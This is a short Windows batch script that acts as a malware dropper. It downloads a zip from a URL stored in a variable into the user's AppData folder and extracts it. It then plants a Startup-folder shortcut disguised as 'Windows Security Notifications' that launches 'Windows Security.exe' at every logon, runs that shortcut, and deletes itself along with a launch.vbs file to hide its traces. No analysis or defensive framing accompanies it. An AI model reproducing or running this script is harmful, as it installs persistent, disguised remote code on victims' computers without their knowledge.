del launch.vbs
cd %appdata%
powershell -Command "Invoke-WebRequest "%Defendeurmum%" -OutFile Defender.zip"
powershell -command "Expand-Archive -Force 'Defender.zip' 'Windows_file'"
del Defender.zip
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Notifications.lnk');$s.TargetPath='%appdata%/Windows_file/Defender/"Windows Security.exe"';$s.Save()"
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
"Windows Security Notifications.lnk"
(goto) 2>nul & del "%~f0"
